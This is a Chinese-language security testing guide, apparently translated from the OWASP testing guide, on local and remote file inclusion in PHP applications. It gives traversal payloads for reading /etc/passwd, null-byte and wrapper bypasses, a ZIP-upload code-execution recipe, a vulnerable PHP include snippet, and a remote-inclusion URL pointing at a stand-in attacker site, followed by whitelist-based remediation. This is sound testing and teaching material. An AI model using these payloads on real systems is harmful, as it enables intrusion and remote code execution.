# 测试文件包含

## 概述

文件包含漏洞允许攻击者包含一个文件，通常利用目标应用程序中实现的“动态文件包含”机制。该漏洞是由于使用了未经适当验证的用户输入而产生的。

这可能导致简单如输出文件内容的结果，但也可能导致：

- 在 Web 服务器上执行代码
- 在客户端执行代码，例如 JavaScript，这可能引发其他攻击，如跨站脚本（XSS）
- 拒绝服务（DoS）
- 敏感信息泄露

本地文件包含（LFI）是通过利用应用程序中实现的存在漏洞的包含过程，包含服务器上已存在的文件的过程。例如，当页面接收到作为本地文件路径的输入时，就会发生此漏洞。该输入未经过适当清理，允许注入目录遍历字符（如 `../`——参见 4.5.1 [测试目录遍历文件包含](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)）。

远程文件包含（RFI）是通过利用应用程序中实现的存在漏洞的包含过程，包含来自远程源的文件的过程。例如，当页面接收到作为远程文件 URL 的输入时，就会发生此漏洞。该输入未经过适当清理，允许注入外部 URL。

在这两种情况下，虽然大多数示例指向易受攻击的 PHP 脚本，但我们应该记住，在其他技术（如 JSP、ASP 等）中也很常见。

## 测试目标

- 识别文件包含点。
- 评估漏洞的严重性或潜在影响。

## 如何测试

### 测试本地文件包含

由于 LFI 发生在传递给 `include` 语句的路径未经过适当清理时，在黑盒测试方法中，我们应寻找接受文件名/路径作为参数的功能。

考虑以下示例：

`https://vulnerable_host/preview.php?file=example.html`

这看起来是一个尝试 LFI 的有希望的地方。如果应用程序没有根据 `file` 参数中选择适当的页面，而是直接包含该输入，则可能包含服务器上的任意文件。

一个典型的验证性概念利用是尝试加载 `passwd` 文件：

`https://vulnerable_host/preview.php?file=../../../../etc/passwd`

如果满足上述条件，攻击者将在响应中看到类似以下内容：

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

即使存在此类漏洞，其在现实场景中的利用可能更加复杂。考虑以下代码片段：

```php
<?php include($_GET['file'].".php"); ?>
```

简单地替换为随机文件名是行不通的，因为后缀 `.php` 被附加到提供的输入上。为了绕过它，测试人员可以使用多种技术来实现预期的利用。

#### 空字节注入

`空字符`（也称为 `空终止符` 或 `空字节`）是一个存在于许多字符集中的控制字符，其值为零，用作标记字符串结尾的保留字符。一旦使用，此特殊字节之后的任何字符都将被忽略。通常注入此字符的方式是在请求路径后附加 URL 编码的字符串 `%00`。在我们之前的示例中，执行对 `https://vulnerable_host/preview.php?file=../../../../etc/passwd%00` 的请求将忽略附加到输入文件名的 `.php` 扩展名，从而成功利用并返回基本用户列表给攻击者。

#### 路径和点截断

大多数 PHP 安装的文件名长度限制为 4096 字节。如果任何给定的文件名超过该长度，PHP 会简单地截断它，丢弃任何额外的字符。滥用此行为可以通过将 `.php` 扩展名移出 4096 字节限制来使 PHP 引擎忽略它。当这种情况发生时，不会触发错误；额外的字符只是被丢弃，PHP 继续正常执行。

这种绕过通常会与其他逻辑绕过策略结合使用，例如使用 Unicode 编码对文件路径的一部分进行编码、引入双重编码或任何其他仍表示有效目标文件名的输入。

#### PHP 封装器

本地文件包含漏洞通常被视为只读漏洞，攻击者可以利用它从托管易受攻击应用程序的服务器读取敏感数据。然而，在某些特定实现中，此漏洞可用于将攻击[从 LFI 升级为远程代码执行](https://www.corben.io/zip-to-rce-lfi/)，这可能完全危及主机。

当攻击者能够将 [LFI 漏洞与某些 PHP 封装器](https://www.netsparker.com/blog/web-security/php-stream-wrappers/) 结合时，这种增强很常见。

封装器是围绕其他代码以执行某些附加功能的代码。PHP 实现了许多[内置封装器](https://www.php.net/manual/en/wrappers.php)以与文件系统函数一起使用。一旦在应用程序测试过程中检测到它们的使用，尝试滥用它们以识别检测到的弱点的实际风险是一种良好的实践。以下是常用封装器的列表，但您应考虑到它并非详尽无遗，同时也可以注册自定义封装器，如果目标使用了这些封装器，则需要更深入的专门分析。

##### PHP Filter

用于访问本地文件系统；这是一个不区分大小写的封装器，提供在打开文件时将筛选器应用于流的能力。此封装器可用于获取文件内容，同时防止服务器执行它。例如，允许攻击者读取 PHP 文件的内容以获取源代码，从而识别敏感信息（如凭据）或其他可利用的漏洞。

该封装器可以像 `php://filter/convert.base64-encode/resource=FILE` 这样使用，其中 `FILE` 是要检索的文件。由于使用此执行，目标文件的内容将被读取、编码为 base64（这是防止服务器端执行的步骤），并返回给用户代理。

##### PHP ZIP

在 PHP 7.2.0 中，引入了 `zip://` 封装器来操作 `zip` 压缩文件。此封装器期望以下参数结构：`zip:///filename_path#internal_filename`。`filename_path` 是恶意 ZIP 存档的路径，`internal_filename` 是放置在已处理 ZIP 文件中的恶意文件的路径。在利用过程中，通常会将 `#` 编码为其 URL 编码值 `%23`。

滥用此封装器可以允许攻击者设计一个恶意 ZIP 文件，该文件可以上传到服务器，例如作为头像图像，或使用目标站点上可用的任何文件上传系统（`php:zip://` 封装器不需要 ZIP 文件具有任何特定扩展名），然后由 LFI 漏洞执行。

为了测试此漏洞，可以按照以下过程来攻击之前提供的代码示例。

1. 创建要执行的 PHP 文件，例如内容为 `<?php phpinfo(); ?>`，并将其保存为 `code.php`。
2. 将其压缩为名为 `target.zip` 的新 ZIP 文件。
3. 将 `target.zip` 文件重命名为 `target.jpg` 以绕过扩展名验证，并将其作为头像图像上传到目标网站。
4. 假设 `target.jpg` 文件在服务器上本地存储到 `../avatar/target.jpg` 路径，通过将以下负载注入易受攻击的 URL 来利用 PHP ZIP 封装器漏洞：`zip://../avatar/target.jpg%23code`（记住 `%23` 对应于 `#`）。

由于在我们的示例中，`.php` 扩展名被附加到我们的负载上，对 `https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` 的请求将导致执行恶意 ZIP 文件中存在的 `code.php` 文件。

##### PHP Data

自 PHP 5.2.0 起可用，此封装器期望以下用法：`data://text/plain;base64,BASE64_STR`，其中 `BASE64_STR` 应为要处理的文件的 base64 编码内容。重要的是要考虑，此封装器仅在启用 `allow_url_include` 选项时才可用。

为了使用此封装器测试 LFI，要执行的代码应进行 base64 编码。例如，`<?php phpinfo(); ?>` 将编码为：`PD9waHAgcGhwaW5mbygpOyA/Pg==`，负载将表示为：`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`。

##### PHP Expect

此封装器默认未启用，提供对进程 `stdio`、`stdout` 和 `stderr` 的访问。格式为 `expect://command`，服务器将使用 `BASH` 执行提供的命令并返回结果。

### 测试远程文件包含

由于 RFI 发生在传递给 `include` 语句的 URL 未经过适当清理时，在黑盒测试方法中，我们应寻找以文件名作为参数的脚本。考虑以下 PHP 示例：

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

在此示例中，路径从 HTTP 请求中提取，并且未进行输入验证（例如，通过将输入与白名单进行检查），因此这段代码容易受到此类攻击。考虑以下 URL：

`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`

在这种情况下，将包含远程文件，并且其中包含的任何代码都将由服务器运行。

## 修复

消除文件包含漏洞的最有效解决方案是避免将用户提交的输入传递给任何文件系统/框架 API。如果这不可能，应用程序可以维护一个页面可包含文件的白名单，然后使用标识符（例如索引号）来访问选定的文件。任何包含无效标识符的请求都应被拒绝，以便恶意用户无法操纵路径。
查看[文件上传速查表](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)以获取有关此主题的良好安全实践。
